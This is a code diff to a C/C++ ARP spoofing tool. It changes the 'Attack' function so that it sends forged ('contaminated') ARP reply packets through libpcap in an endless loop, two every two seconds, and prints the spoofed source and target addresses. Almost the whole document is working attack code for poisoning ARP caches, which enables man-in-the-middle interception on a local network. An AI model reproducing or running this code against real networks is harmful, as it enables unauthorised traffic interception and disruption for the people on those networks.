@@ -32,7 +32,7 @@ void convert_mac(const char* data, char* cvrt_str, int s){
 }
 
 // ########## Sending contaminated ARP packets ##########
-void Attack(void* info){
+void* Attack(void* info){
 	struct Parameter_Pthread* PP = (struct Parameter_Pthread*)(info);
 	struct in_addr src_in_addr, target_in_addr;
 	struct ARP_header* attack_packet = (struct ARP_header*)malloc(sizeof(struct ARP_header)); // reply
@@ -56,15 +56,20 @@ void Attack(void* info){
 
 	bzero(attack_packet->padding, 18);
 
-	for(int i = 0; i < 2; i++){
-		printf("\n----------_ARP %d_----------\n", PP->session_Number);
-		printf("tip : %s\n", PP->tip);
-		printf("sip : %s\n", PP->sip);
-		//Print_ARP(&attack_packet);
-		if(pcap_sendpacket(PP->handle, reinterpret_cast<u_char*>(attack_packet), 42) != 0){
-			perror("send packet error");
-			exit(1);
+	while(1){ // 2 attacks per 2 seconds
+		for(int i = 0; i < 2; i++){
+			printf("\n----------_ARP %d_----------\n", PP->session_Number);
+			printf("sip : %s\n", PP->sip);
+			printf("smac : %s\n", PP->smac);
+			printf("tip : %s\n", PP->tip);
+			printf("tmac : %s\n", PP->tmac);
+			//Print_ARP(&attack_packet);
+			if(pcap_sendpacket(PP->handle, reinterpret_cast<u_char*>(attack_packet), 42) != 0){
+				perror("send packet error");
+				exit(1);
+			}
 		}
+		sleep(2);
 	}
 }
 
